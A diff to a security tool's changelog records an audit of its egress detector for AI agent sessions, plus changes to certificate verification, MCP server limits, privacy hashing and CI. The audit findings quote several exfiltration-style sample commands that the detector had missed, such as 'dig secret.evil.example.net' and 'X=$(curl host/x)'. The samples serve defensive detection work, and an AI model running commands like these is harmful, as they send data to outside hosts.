@@ -6,6 +6,44 @@ project uses [Semantic Versioning](https://semver.org/).
 
 ## [Unreleased]
 
+### Audit 2026-11-24
+
+A static audit of v0.8.0-to-be, read against this file, `README.md` and
+`SECURITY.md`. The findings are listed by identifier because several were not
+bugs in the code but **claims the documents made that the code did not keep** —
+and an undeclared gap is worse than a declared one.
+
+**Closed in `fix/egress-coverage`** (egress extraction, merged before this):
+
+| id | finding |
+|---|---|
+| EGR-001 | an internationalised domain was read as "not a host": `https://collector.xn--p1ai/x` reached nobody |
+| EGR-002 | only six URL schemes, and no cloud, resolver or database clients: `aws s3 cp f s3://bucket/k` and `dig secret.evil.example.net` named nothing |
+| EGR-003 | an address written as an integer, in hex or in octal was not an address: `http://2130706433/x` |
+| EGR-004 | the filename-label list was unpinned — a label that becomes a gTLD turns it into an egress hole, silently |
+| EGR-005 | a command substituted into an assignment went unread with the assignment: `X=$(curl host/x)` |
+| INT-002 | the benchmark quoted a detection rate that left declared blind spots out of the denominator |
+
+**Closed here:**
+
+| id | finding |
+|---|---|
+| INT-001 | `__version__` said 0.7.0 while the tree wrote `cert_format` 3, which no 0.7.0 can read. Now `0.8.0.dev0`, with `MIN_VERSION_FOR_FORMAT` tying each format to the oldest version allowed to write it, and a test that fails if a format is added without its version |
+| CRY-001 | `verify` exited 0 for a certificate that could not be checked against the session's destinations. It now exits **3** — "signature and topology valid, egress coverage not verifiable" — and `--accept-unverified-egress` returns that case to 0 explicitly |
+| CRY-003 | a certificate with no validity window (format 1) verified as valid. With no expiry and no revocation, that is a credential nothing can retire: it now fails unless `--allow-no-expiry` is given |
+| CRY-002 | the absence of revocation was a half-sentence. `SECURITY.md` §2 now states it as a property of the trust model, with the procedure that exists today (destroy the key, re-issue, shorten `--validity-days` for a certificate that leaves the organisation). The revocation file goes to v0.9 |
+| MCP-001 | a timed-out MCP request abandons its thread — Python cannot kill one — so a retrying client piled threads up and made every later call slower. The server now refuses past `MAX_INFLIGHT` (2) with `server busy: N earlier request(s) still running`, and logs how many it has abandoned |
+| PRV-001 | the project name (a filesystem path, so it can carry a user or client name) and the session id were exported in four places and named in neither document. Both are now named in `SECURITY.md` §5 and §6 and in the README, and `scan`/`watch --hash-project` replaces the project name with `sha256:<12 hex>` in the report, the JSON, the OTel span and the HTML |
+| CFG-001 | CI tested three Python versions and the package claimed support for three; the matrix is now 3.10 – 3.14 |
+| CFG-002 | the classifiers did not list 3.13 or 3.14 |
+| SCA-002 | the dependency floors were asserted and never installed by anything. They are now **tested** floors: `numpy>=1.26.4` and `cryptography>=46.0.0`, installed exactly by a new `lowest` CI job under Python 3.10 which runs the whole suite and `pip-audit` against them. Set low enough to install on a frozen corporate image, because an unconstrained install takes the newest release anyway and a floor that blocks the install protects nobody. Hash-pinned locking goes to v0.9 |
+| DOC-001 | "Development Status :: 3 - Alpha" for a package with a signed certificate format, a benchmark and a security policy: now **4 - Beta** |
+| LIC-001 | a region report used DB-IP data under CC BY 4.0 without crediting it. `scan`, `watch` and `verify` now print `IP geolocation by DB-IP.com, CC BY 4.0` on stderr whenever `--geoip-db` was read |
+
+**Deferred to v0.9** (in `ROADMAP.md`): the revocation file (CRY-002), and
+hash-pinned dependency locking (SCA-002). Raising the floors becomes a step of
+each release, since they are set low on purpose and go stale by design.
+
 ### Added
 - **Five classes of egress false negative closed** (`agent_certify.domains`).
   A static audit of the extractor found five ways to reach a destination that
@@ -59,6 +97,17 @@ project uses [Semantic Versioning](https://semver.org/).
   reported as **`ccTLD (IDN)`**. A `forbidden_region RU` rule now reaches
   `collector.xn--p1ai`; before, the region came back `unknown` and the rule
   written to stop that destination said nothing about it
+- **`scan --hash-project` and `watch --hash-project`**: the project name,
+  which is derived from a filesystem path and can carry a user or client name,
+  is replaced by `sha256:<first 12 hex characters>` in every output — report,
+  JSON, OTel span, HTML. Stable, so sessions of one project still group
+  together; pseudonymisation rather than anonymisation, and documented as such
+- **`verify --allow-no-expiry`** and **`verify --accept-unverified-egress`**:
+  the two waivers the new refusals need, each explicit and each warning on
+  stderr
+- **Attribution for GeoIP data**: `scan`, `watch` and `verify` print
+  `IP geolocation by DB-IP.com, CC BY 4.0` on stderr whenever `--geoip-db` was
+  read, as CC BY 4.0 asks
 - **Six benchmark injections** — `idn_domain`, `cloud_storage`, `dns_exfil`,
   `numeric_ipv4`, `assignment_substitution`, each building a real argument
   object and handing it to the production extractor, all expected as
@@ -67,6 +116,30 @@ project uses [Semantic Versioning](https://semver.org/).
   All six detected on every trial
 
 ### Changed
+- **`verify` has a third exit code.** 0 valid, 1 invalid, 2 usage, **3 signature
+  and topology valid but egress coverage not verifiable** — the certificate
+  carries no observed destinations and the session reached some, so whether
+  those were the certified ones cannot be decided. `--accept-unverified-egress`
+  makes that case 0. Documented in the README and in `verify --help`
+- **A certificate with no validity window fails** (`cert_format` 1, issued
+  before v0.5): no expiry plus no revocation is a credential nothing can
+  retire. `--allow-no-expiry` accepts one with a warning
+- **`__version__` is `0.8.0.dev0`**, and `MIN_VERSION_FOR_FORMAT` ties each
+  certificate format to the oldest version allowed to write it
+- **The dependency floors are tested, and deliberately low**:
+  `numpy>=1.26.4` (the oldest release the suite passes on under Python 3.10)
+  and `cryptography>=46.0.0` (the oldest series with the Ed25519 API and wheels
+  for every interpreter in the matrix, ~14 months old). A new **`lowest` CI
+  job** installs exactly those two versions under Python 3.10, runs the suite,
+  and runs `pip-audit` on that resolution without failing the build. The
+  reasoning is in `pyproject.toml` and in `SECURITY.md` §2: an unconstrained
+  install takes the newest release, so a high floor blocks frozen deployments
+  without protecting anyone, while a frozen deployment has to follow
+  `cryptography`'s advisories itself
+- **CI matrix 3.10 – 3.14**, classifiers to match, and
+  `Development Status :: 4 - Beta`
+- **The MCP server refuses a tool call past two in flight** rather than piling
+  up threads it cannot cancel, and reports how many it has abandoned
 - **The benchmark reports two detection rates, always together**: the rate
   among the fault types a check is meant to catch, and the rate over
   **everything injected with the blind spots in the denominator**
